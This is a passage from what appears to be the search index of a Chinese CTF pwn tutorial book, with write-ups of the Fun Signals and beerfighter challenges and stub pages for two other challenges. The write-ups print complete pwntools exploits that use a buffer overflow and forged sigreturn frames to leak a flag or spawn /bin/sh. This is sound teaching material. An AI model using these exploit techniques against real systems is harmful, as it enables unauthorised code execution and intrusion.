r12 :   0 ,   rsi :   0 ,   r10 :   0 ,   r11 :   0 ,   fpstate :   0 ,   rip :   0 ,   csgsfs :   51 ,   uc_stack.ss_flags :   0 ,   oldmask :   0 ,   sigmask :   0 ,   rsp :   0 ,   rax :   0 ,   r13 :   0 ,   cr2 :   0 ,   r9 :   0 ,   rcx :   0 ,   trapno :   0 ,   err :   0 ,   rbx :   0 ,   uc_stack.ss_sp :   0 ,   r8 :   0 ,   rdx :   0 ,   rbp :   0 ,   uc_flags :   0 ,   __reserved :   0 ,   uc :   0 ,   eflags :   0 ,   rdi :   0 ,   uc_stack.ss_size :   0 }  \n\u603b\u5171\u6709\u4e09\u79cd\uff0c\u7ed3\u6784\u548c\u521d\u59cb\u5316\u7684\u503c\u4f1a \u6709\u6240\u4e0d\u540c\uff1a\n- i386 on i386\uff1a32 \u4f4d\u7cfb\u7edf\u4e0a\u8fd0\u884c 32 \u4f4d\u7a0b\u5e8f\n- i386 on amd64\uff1a64 \u4f4d\u7cfb\u7edf\u4e0a\u8fd0\u884c 32 \u4f4d\u7a0b\u5e8f\n- amd64 on amd64\uff1a64 \u4e3a\u7cfb\u7edf\u4e0a\u8fd0\u884c 64 \u4f4d\u7a0b\u5e8f", 
            "title": "pwnlib.rop.srop"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#backdoorctf2017-fun-signals", 
            "text": "$ file funsignals_player_bin\nfunsignals_player_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped \n\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u9759\u6001\u94fe\u63a5\u7684 srop\uff0c\u53ef\u4ee5\u8bf4\u662f\u4ec0\u4e48\u90fd\u6ca1\u5f00\u3002\u3002\u3002 $ checksec -f funsignals_player_bin\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nNo RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No       0               0       funsignals_player_bin  gdb-peda$ disassemble _start\nDump of assembler code for function _start:\n   0x0000000010000000  +0 :     xor    eax,eax\n   0x0000000010000002  +2 :     xor    edi,edi\n   0x0000000010000004  +4 :     xor    edx,edx\n   0x0000000010000006  +6 :     mov    dh,0x4\n   0x0000000010000008  +8 :     mov    rsi,rsp\n   0x000000001000000b  +11 :    syscall\n   0x000000001000000d  +13 :    xor    edi,edi\n   0x000000001000000f  +15 :    push   0xf\n   0x0000000010000011  +17 :    pop    rax\n   0x0000000010000012  +18 :    syscall\n   0x0000000010000014  +20 :    int3   \nEnd of assembler dump.\ngdb-peda$ disassemble syscall\nDump of assembler code for function syscall:\n   0x0000000010000015  +0 :     syscall\n   0x0000000010000017  +2 :     xor    rdi,rdi\n   0x000000001000001a  +5 :     mov    rax,0x3c\n   0x0000000010000021  +12 :    syscall\nEnd of assembler dump.\ngdb-peda$ x/s flag\n0x10000023  flag :       fake_flag_here_as_original_is_at_server  \n\u800c\u4e14 flag \u5c31\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\uff0c\u53ea\u4e0d\u8fc7\u662f\u5728\u670d\u52a1\u5668\u4e0a\u7684\u90a3\u4e2a\u91cc\u9762\uff0c\u8fc7\u7a0b\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002  \u9996\u5148\u53ef\u4ee5\u770b\u5230  _start  \u51fd\u6570\u91cc\u6709\u4e24\u4e2a syscall\u3002\u7b2c\u4e00\u4e2a\u662f  read(0, $rip, 0x400) \uff08\u8c03\u7528\u53f7 0x0 \uff09\uff0c\u5b83\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6  0x400  \u4e2a\u5b57\u8282\u5230  rip  \u6307\u5411\u7684\u5730\u5740\u5904\uff0c\u4e5f\u5c31\u662f\u6808\u4e0a\u3002\u7b2c\u4e8c\u4e2a\u662f  sigreturn() \uff08\u8c03\u7528\u53f7 0xf \uff09\uff0c\u5b83\u5c06\u4ece\u6808\u4e0a\u8bfb\u53d6 sigreturn frame\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a frame\u3002  \u90a3\u4e48\u600e\u6837\u8bfb\u53d6 flag \u5462\uff0c\u9700\u8981\u4e00\u4e2a  write(1,  flag, 50) \uff0c\u8c03\u7528\u53f7\u4e3a  0x1 \uff0c\u800c\u51fd\u6570  syscall  \u6b63\u597d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86  syscall  \u6307\u4ee4\uff0c\u6784\u9020 payload \u5982\u4e0b\uff1a from   pwn   import   *  elf   =   ELF ( ./funsignals_player_bin )  io   =   process ( ./funsignals_player_bin )  # io = remote( hack.bckdr.in , 9034)  context . clear ()  context . arch   =   amd64  # Creating a custom frame  frame   =   SigreturnFrame ()  frame . rax   =   constants . SYS_write  frame . rdi   =   constants . STDOUT_FILENO  frame . rsi   =   elf . symbols [ flag ]  frame . rdx   =   50  frame . rip   =   elf . symbols [ syscall ]  io . send ( str ( frame ))  io . interactive ()   $ python2 exp_funsignals.py\n[*]  /home/firmy/Desktop/funsignals_player_bin \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x10000000)\n    RWX:      Has RWX segments\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] Switching to interactive mode\nfake_flag_here_as_original_is_at_server\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[*] Got EOF while reading in interactive \n\u5982\u679c\u8fde\u63a5\u7684\u662f\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c fake_flag_here_as_original_is_at_server  \u4f1a\u88ab\u66ff\u6362\u6210\u771f\u6b63\u7684 flag\u3002  \u8fd9\u4e00\u8282\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e86 SROP \u7684\u539f\u7406\uff0c\u5e76\u5c55\u793a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\uff0c\u4f1a\u5c55\u793a\u5176\u66f4\u590d\u6742\u7684\u8fd0\u7528\uff0c\u5305\u6269\u7ed3\u5408 vDSO \u7684\u7528\u6cd5\u3002", 
            "title": "BackdoorCTF2017 Fun Signals"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#_1", 
            "text": "Framing Signals\u2014A Return to Portable Shellcode  slides: Framing Signals a return to portable shellcode  Sigreturn Oriented Programming  Sigreturn Oriented Programming is a real Threat  Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.5_pwn_grehackctf2017_beerfighter/", 
            "text": "\u9898\u76ee\u89e3\u6790\n\n\nExploit\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n$ file game\ngame: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1f9b11cb913afcbbbf9cb615709b3c62b2fdb5a2, stripped\n$ checksec -f game\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               0       game\n\n\n64 \u4f4d\uff0c\u9759\u6001\u94fe\u63a5\uff0cstripped\u3002\n\n\n\u65e2\u7136\u662f\u4e2a\u5c0f\u6e38\u620f\uff0c\u5148\u73a9\u4e00\u4e0b\uff0c\u7136\u540e\u53d1\u73b0\uff0c\u8fdb\u5165 City Hall \u540e\uff0c\u6709\u4e00\u4e2a\u53ef\u4ee5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u5730\u65b9\uff0c\u7136\u800c\u5373\u4f7f\u6211\u4eec\u4ec0\u4e48\u4e5f\u4e0d\u8f93\u5165\uff0c\u76f4\u63a5\u56de\u8f66\uff0c\u5728 Leave the town \u65f6\u4e5f\u4f1a\u51fa\u73b0 Segmentation fault\uff1a\n\n[0] The bar\n[1] The City Hall\n[2] The dark yard\n[3] Leave the town for ever\nType your action number \n 1\nWelcome Newcomer! I am the mayor of this small town and my role is to register the names of its citizens.\nHow should I call you?\n[0] Tell him your name\n[1] Leave\nType your action number \n 0\nType your character name here \n\n\n...\n\n[0] The bar\n[1] The City Hall\n[2] The dark yard\n[3] Leave the town for ever\nType your action number \n 3\nBy !\n\nSegmentation fault (core dumped)\n\n\n\n\u7a0b\u5e8f\u5927\u6982\u6e05\u695a\u4e86\uff0c\u770b\u4ee3\u7801\u5427\uff0c\u7ecf\u8fc7\u4e00\u756a\u641c\u7d22\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u51fd\u6570\uff1a\n\n[0x00400d8e]\n pdf @ fcn.00400773\n/ (fcn) fcn.00400773 15\n|   fcn.00400773 ();\n|              ; CALL XREF from 0x00400221 (fcn.004001f3)\n|              ; CALL XREF from 0x004002b6 (fcn.00400288)\n|           0x00400773      4889f8         mov rax, rdi\n|           0x00400776      4889f7         mov rdi, rsi\n|           0x00400779      4889d6         mov rsi, rdx\n|           0x0040077c      4889ca         mov rdx, rcx\n|           0x0040077f      0f05           syscall\n\\           0x00400781      c3             ret\n\n\n\nsyscall;ret\n\uff0c\u4f60\u60f3\u5230\u4e86\u4ec0\u4e48\uff0c\u5bf9\uff0c\u5c31\u662f\u524d\u9762\u8bb2\u7684 SROP\u3002\n\n\n\u5176\u5b9e\u524d\u9762\u7684\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7a0b\u5e8f\u4e5f\u662f\u901a\u8fc7 syscall \u6765\u8bfb\u5165\u7684\uff0c\u4ece\u51fd\u6570 \n0x004004b8\n \u5f00\u59cb\u4ed4\u7ec6\u8ddf\u8e2a\u4ee3\u7801\u540e\u5c31\u4f1a\u77e5\u9053\uff0c\u7cfb\u7edf\u8c03\u7528\u4e3a \nread()\n\u3002\n\n\ngdb-peda$ pattern_offset $ebp\n1849771374 found at offset: 1040\n\n\n\u7f13\u51b2\u533a\u8fd8\u633a\u5927\u7684\uff0c\n1040+8=1048\n\u3002\n\n\n\u597d\uff0c\u73b0\u5728\u601d\u8def\u5df2\u7ecf\u6e05\u6670\u4e86\uff0c\u5148\u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u7528 \nsyscall;ret\n \u5730\u5740\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u901a\u8fc7 frame_1 \u8c03\u7528 \nread()\n \u8bfb\u5165 frame_2 \u5230 \n.data\n \u6bb5\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u6ca1\u6709\n.bss\n\uff0c\u800c\u4e14\n.data\n\u53ef\u5199\uff09\uff0c\u7136\u540e\u5c06\u6808\u8f6c\u79fb\u8fc7\u53bb\uff0c\u8c03\u7528 \nexecve()\n \u6267\u884c\u201c/bin/sh\u201d\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002\n\n\n\u6784\u9020 sigreturn\uff1a\n\n$ ropgadget --binary game --only \npop|ret\n\n...\n0x00000000004007b2 : pop rax ; ret\n\n\n\n# sigreturn syscall\n\n\nsigreturn\n  \n=\n \np64\n(\npop_rax_addr\n)\n\n\nsigreturn\n \n+=\n \np64\n(\nconstants\n.\nSYS_rt_sigreturn\n)\n    \n# 0xf\n\n\nsigreturn\n \n+=\n \np64\n(\nsyscall_addr\n)\n\n\n\n\n\u7136\u540e\u662f frame_1\uff0c\u901a\u8fc7\u8bbe\u5b9a \nframe_1.rsp = base_addr\n \u6765\u8f6c\u79fb\u6808\uff1a\n\n# frame_1: read frame_2 to .data\n\n\nframe_1\n \n=\n \nSigreturnFrame\n()\n\n\nframe_1\n.\nrax\n \n=\n \nconstants\n.\nSYS_read\n\n\nframe_1\n.\nrdi\n \n=\n \nconstants\n.\nSTDIN_FILENO\n\n\nframe_1\n.\nrsi\n \n=\n \ndata_addr\n\n\nframe_1\n.\nrdx\n \n=\n \nlen\n(\nstr\n(\nframe_2\n))\n\n\nframe_1\n.\nrsp\n \n=\n \nbase_addr\n             \n# stack pivot\n\n\nframe_1\n.\nrip\n \n=\n \nsyscall_addr\n\n\n\n\nframe_2 \u6267\u884c \nexecve()\n\uff1a\n\n# frame_2: execve to get shell\n\n\nframe_2\n \n=\n \nSigreturnFrame\n()\n\n\nframe_2\n.\nrax\n \n=\n \nconstants\n.\nSYS_execve\n\n\nframe_2\n.\nrdi\n \n=\n \ndata_addr\n\n\nframe_2\n.\nrsi\n \n=\n \n0\n\n\nframe_2\n.\nrdx\n \n=\n \n0\n\n\nframe_2\n.\nrip\n \n=\n \nsyscall_addr\n\n\n\n\nBingo!!!\n\n$ python2 exp.py\n[*] \n/home/firmy/Desktop/game\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Starting local process \n./game\n: pid 12975\n[*] Switching to interactive mode\nBy !\n\n$ whoami\nfirmy\n\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nelf\n \n=\n \nELF\n(\n./game\n)\n\n\nio\n \n=\n \nprocess\n(\n./game\n)\n\n\nio\n.\nrecvuntil\n(\n \n)\n\n\nio\n.\nsendline\n(\n1\n)\n\n\nio\n.\nrecvuntil\n(\n \n)\n\n\nio\n.\nsendline\n(\n0\n)\n\n\nio\n.\nrecvuntil\n(\n \n)\n\n\n\ncontext\n.\nclear\n()\n\n\ncontext\n.\narch\n \n=\n \namd64\n\n\n\ndata_addr\n \n=\n \nelf\n.\nget_section_by_name\n(\n.data\n)\n.\nheader\n.\nsh_addr\n \n+\n \n0x10\n\n\nbase_addr\n \n=\n \ndata_addr\n \n+\n \n0x8\n   \n# new stack address\n\n\n\n# useful gadget\n\n\npop_rax_addr\n \n=\n \n0x00000000004007b2\n   \n# pop rax ; ret\n\n\nsyscall_addr\n \n=\n \n0x000000000040077f\n   \n# syscall ;\n\n\n\n# sigreturn syscall\n\n\nsigreturn\n  \n=\n \np64\n(\npop_rax_addr\n)\n\n\nsigreturn\n \n+=\n \np64\n(\nconstants\n.\nSYS_rt_sigreturn\n)\n    \n# 0xf\n\n\nsigreturn\n \n+=\n \np64\n(\nsyscall_addr\n)\n\n\n\n# frame_2: execve to get shell\n\n\nframe_2\n \n=\n \nSigreturnFrame\n()\n\n\nframe_2\n.\nrax\n \n=\n \nconstants\n.\nSYS_execve\n\n\nframe_2\n.\nrdi\n \n=\n \ndata_addr\n\n\nframe_2\n.\nrsi\n \n=\n \n0\n\n\nframe_2\n.\nrdx\n \n=\n \n0\n\n\nframe_2\n.\nrip\n \n=\n \nsyscall_addr\n\n\n\n# frame_1: read frame_2 to .data\n\n\nframe_1\n \n=\n \nSigreturnFrame\n()\n\n\nframe_1\n.\nrax\n \n=\n \nconstants\n.\nSYS_read\n\n\nframe_1\n.\nrdi\n \n=\n \nconstants\n.\nSTDIN_FILENO\n\n\nframe_1\n.\nrsi\n \n=\n \ndata_addr\n\n\nframe_1\n.\nrdx\n \n=\n \nlen\n(\nstr\n(\nframe_2\n))\n\n\nframe_1\n.\nrsp\n \n=\n \nbase_addr\n             \n# stack pivot\n\n\nframe_1\n.\nrip\n \n=\n \nsyscall_addr\n\n\n\npayload_1\n  \n=\n \nA\n \n*\n \n1048\n\n\npayload_1\n \n+=\n \nsigreturn\n\n\npayload_1\n \n+=\n \nstr\n(\nframe_1\n)\n\n\n\nio\n.\nsendline\n(\npayload_1\n)\n\n\nio\n.\nrecvuntil\n(\n \n)\n\n\nio\n.\nsendline\n(\n3\n)\n\n\n\npayload_2\n  \n=\n \n/bin/sh\n\\x00\n\n\npayload_2\n \n+=\n \nsigreturn\n\n\npayload_2\n \n+=\n \nstr\n(\nframe_2\n)\n\n\n\nio\n.\nsendline\n(\npayload_2\n)\n\n\nio\n.\ninteractive\n()", 
            "title": "GreHackCTF2017 beerfighter"
        }, 
        {
            "location": "/pwn/lab/6.1.5_pwn_grehackctf2017_beerfighter/#_1", 
            "text": "$ file game\ngame: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1f9b11cb913afcbbbf9cb615709b3c62b2fdb5a2, stripped\n$ checksec -f game\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               0       game \n64 \u4f4d\uff0c\u9759\u6001\u94fe\u63a5\uff0cstripped\u3002  \u65e2\u7136\u662f\u4e2a\u5c0f\u6e38\u620f\uff0c\u5148\u73a9\u4e00\u4e0b\uff0c\u7136\u540e\u53d1\u73b0\uff0c\u8fdb\u5165 City Hall \u540e\uff0c\u6709\u4e00\u4e2a\u53ef\u4ee5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u5730\u65b9\uff0c\u7136\u800c\u5373\u4f7f\u6211\u4eec\u4ec0\u4e48\u4e5f\u4e0d\u8f93\u5165\uff0c\u76f4\u63a5\u56de\u8f66\uff0c\u5728 Leave the town \u65f6\u4e5f\u4f1a\u51fa\u73b0 Segmentation fault\uff1a [0] The bar\n[1] The City Hall\n[2] The dark yard\n[3] Leave the town for ever\nType your action number   1\nWelcome Newcomer! I am the mayor of this small town and my role is to register the names of its citizens.\nHow should I call you?\n[0] Tell him your name\n[1] Leave\nType your action number   0\nType your character name here  \n\n...\n\n[0] The bar\n[1] The City Hall\n[2] The dark yard\n[3] Leave the town for ever\nType your action number   3\nBy !\n\nSegmentation fault (core dumped)  \u7a0b\u5e8f\u5927\u6982\u6e05\u695a\u4e86\uff0c\u770b\u4ee3\u7801\u5427\uff0c\u7ecf\u8fc7\u4e00\u756a\u641c\u7d22\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u51fd\u6570\uff1a [0x00400d8e]  pdf @ fcn.00400773\n/ (fcn) fcn.00400773 15\n|   fcn.00400773 ();\n|              ; CALL XREF from 0x00400221 (fcn.004001f3)\n|              ; CALL XREF from 0x004002b6 (fcn.00400288)\n|           0x00400773      4889f8         mov rax, rdi\n|           0x00400776      4889f7         mov rdi, rsi\n|           0x00400779      4889d6         mov rsi, rdx\n|           0x0040077c      4889ca         mov rdx, rcx\n|           0x0040077f      0f05           syscall\n\\           0x00400781      c3             ret  syscall;ret \uff0c\u4f60\u60f3\u5230\u4e86\u4ec0\u4e48\uff0c\u5bf9\uff0c\u5c31\u662f\u524d\u9762\u8bb2\u7684 SROP\u3002  \u5176\u5b9e\u524d\u9762\u7684\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7a0b\u5e8f\u4e5f\u662f\u901a\u8fc7 syscall \u6765\u8bfb\u5165\u7684\uff0c\u4ece\u51fd\u6570  0x004004b8  \u5f00\u59cb\u4ed4\u7ec6\u8ddf\u8e2a\u4ee3\u7801\u540e\u5c31\u4f1a\u77e5\u9053\uff0c\u7cfb\u7edf\u8c03\u7528\u4e3a  read() \u3002  gdb-peda$ pattern_offset $ebp\n1849771374 found at offset: 1040 \n\u7f13\u51b2\u533a\u8fd8\u633a\u5927\u7684\uff0c 1040+8=1048 \u3002  \u597d\uff0c\u73b0\u5728\u601d\u8def\u5df2\u7ecf\u6e05\u6670\u4e86\uff0c\u5148\u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u7528  syscall;ret  \u5730\u5740\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u901a\u8fc7 frame_1 \u8c03\u7528  read()  \u8bfb\u5165 frame_2 \u5230  .data  \u6bb5\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u6ca1\u6709 .bss \uff0c\u800c\u4e14 .data \u53ef\u5199\uff09\uff0c\u7136\u540e\u5c06\u6808\u8f6c\u79fb\u8fc7\u53bb\uff0c\u8c03\u7528  execve()  \u6267\u884c\u201c/bin/sh\u201d\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002  \u6784\u9020 sigreturn\uff1a $ ropgadget --binary game --only  pop|ret \n...\n0x00000000004007b2 : pop rax ; ret  # sigreturn syscall  sigreturn    =   p64 ( pop_rax_addr )  sigreturn   +=   p64 ( constants . SYS_rt_sigreturn )      # 0xf  sigreturn   +=   p64 ( syscall_addr )   \u7136\u540e\u662f frame_1\uff0c\u901a\u8fc7\u8bbe\u5b9a  frame_1.rsp = base_addr  \u6765\u8f6c\u79fb\u6808\uff1a # frame_1: read frame_2 to .data  frame_1   =   SigreturnFrame ()  frame_1 . rax   =   constants . SYS_read  frame_1 . rdi   =   constants . STDIN_FILENO  frame_1 . rsi   =   data_addr  frame_1 . rdx   =   len ( str ( frame_2 ))  frame_1 . rsp   =   base_addr               # stack pivot  frame_1 . rip   =   syscall_addr   frame_2 \u6267\u884c  execve() \uff1a # frame_2: execve to get shell  frame_2   =   SigreturnFrame ()  frame_2 . rax   =   constants . SYS_execve  frame_2 . rdi   =   data_addr  frame_2 . rsi   =   0  frame_2 . rdx   =   0  frame_2 . rip   =   syscall_addr   Bingo!!! $ python2 exp.py\n[*]  /home/firmy/Desktop/game \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n[+] Starting local process  ./game : pid 12975\n[*] Switching to interactive mode\nBy !\n\n$ whoami\nfirmy", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.5_pwn_grehackctf2017_beerfighter/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  elf   =   ELF ( ./game )  io   =   process ( ./game )  io . recvuntil (   )  io . sendline ( 1 )  io . recvuntil (   )  io . sendline ( 0 )  io . recvuntil (   )  context . clear ()  context . arch   =   amd64  data_addr   =   elf . get_section_by_name ( .data ) . header . sh_addr   +   0x10  base_addr   =   data_addr   +   0x8     # new stack address  # useful gadget  pop_rax_addr   =   0x00000000004007b2     # pop rax ; ret  syscall_addr   =   0x000000000040077f     # syscall ;  # sigreturn syscall  sigreturn    =   p64 ( pop_rax_addr )  sigreturn   +=   p64 ( constants . SYS_rt_sigreturn )      # 0xf  sigreturn   +=   p64 ( syscall_addr )  # frame_2: execve to get shell  frame_2   =   SigreturnFrame ()  frame_2 . rax   =   constants . SYS_execve  frame_2 . rdi   =   data_addr  frame_2 . rsi   =   0  frame_2 . rdx   =   0  frame_2 . rip   =   syscall_addr  # frame_1: read frame_2 to .data  frame_1   =   SigreturnFrame ()  frame_1 . rax   =   constants . SYS_read  frame_1 . rdi   =   constants . STDIN_FILENO  frame_1 . rsi   =   data_addr  frame_1 . rdx   =   len ( str ( frame_2 ))  frame_1 . rsp   =   base_addr               # stack pivot  frame_1 . rip   =   syscall_addr  payload_1    =   A   *   1048  payload_1   +=   sigreturn  payload_1   +=   str ( frame_1 )  io . sendline ( payload_1 )  io . recvuntil (   )  io . sendline ( 3 )  payload_2    =   /bin/sh \\x00  payload_2   +=   sigreturn  payload_2   +=   str ( frame_2 )  io . sendline ( payload_2 )  io . interactive ()", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.6_pwn_defconctf2015_fuckup/", 
            "text": "ret2vdso \u539f\u7406\n\n\n\u9898\u76ee\u89e3\u6790\n\n\nExploit\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\nret2vdso \u539f\u7406\n\n\n\u5728\u4f60\u4f7f\u7528 \nldd\n \u547d\u4ee4\u65f6\uff0c\u901a\u5e38\u4f1a\u663e\u793a\u51fa vDSO\uff0c\u5982\u4e0b\uff1a\n\n$ ldd /usr/bin/ls\n        linux-vdso.so.1 (0x00007ffff7ffa000)\n        libcap.so.2 =\n /usr/lib/libcap.so.2 (0x00007ffff79b2000)\n        libc.so.6 =\n /usr/lib/libc.so.6 (0x00007ffff75fa000)\n        /lib64/ld-linux-x86-64.so.2 =\n /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd8000)\n\n\n32 \u4f4d\u7a0b\u5e8f\u5219\u4f1a\u663e\u793a \nlinux-gate.so.1\n\uff0c\u90fd\u662f\u4e00\u4e2a\u610f\u601d\u3002\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n$ file fuckup\nfuckup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\n$ checksec -f fuckup\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               0       fuckup\n\n\n\n\nExploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nman vdso\n\n\nReturn to VDSO using ELF Auxiliary Vectors", 
            "title": "DefconCTF2015 fuckup"
        }, 
        {
            "location": "/pwn/lab/6.1.6_pwn_defconctf2015_fuckup/#ret2vdso", 
            "text": "\u5728\u4f60\u4f7f\u7528  ldd  \u547d\u4ee4\u65f6\uff0c\u901a\u5e38\u4f1a\u663e\u793a\u51fa vDSO\uff0c\u5982\u4e0b\uff1a $ ldd /usr/bin/ls\n        linux-vdso.so.1 (0x00007ffff7ffa000)\n        libcap.so.2 =  /usr/lib/libcap.so.2 (0x00007ffff79b2000)\n        libc.so.6 =  /usr/lib/libc.so.6 (0x00007ffff75fa000)\n        /lib64/ld-linux-x86-64.so.2 =  /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd8000) \n32 \u4f4d\u7a0b\u5e8f\u5219\u4f1a\u663e\u793a  linux-gate.so.1 \uff0c\u90fd\u662f\u4e00\u4e2a\u610f\u601d\u3002", 
            "title": "ret2vdso \u539f\u7406"
        }, 
        {
            "location": "/pwn/lab/6.1.6_pwn_defconctf2015_fuckup/#_1", 
            "text": "$ file fuckup\nfuckup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\n$ checksec -f fuckup\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nNo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               0       fuckup", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.6_pwn_defconctf2015_fuckup/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.6_pwn_defconctf2015_fuckup/#_2", 
            "text": "man vdso  Return to VDSO using ELF Auxiliary Vectors", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.7_pwn_0ctf2015_freenote/", 
            "text": "\u9898\u76ee\u89e3\u6790\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n$ file freenote\nfreenote: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=dd259bb085b3a4aeb393ec5ef4f09e312555a64d, stripped\n$ checksec -f freenote\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes      0               2       freenote\n\n\n\n\n\u53c2\u8003\u8d44\u6599", 
            "title": "0CTF2015 freenote"
        }, 
        {
            "location": "/pwn/lab/6.1.7_pwn_0ctf2015_freenote/#_1", 
            "text": "$ file freenote\nfreenote: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=dd259bb085b3a4aeb393ec5ef4f09e312555a64d, stripped\n$ checksec -f freenote\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes      0               2       freenote", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.7_pwn_0ctf2015_freenote/#_2", 
            "text": "", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.8_pwn_dctf2017_flex/", 
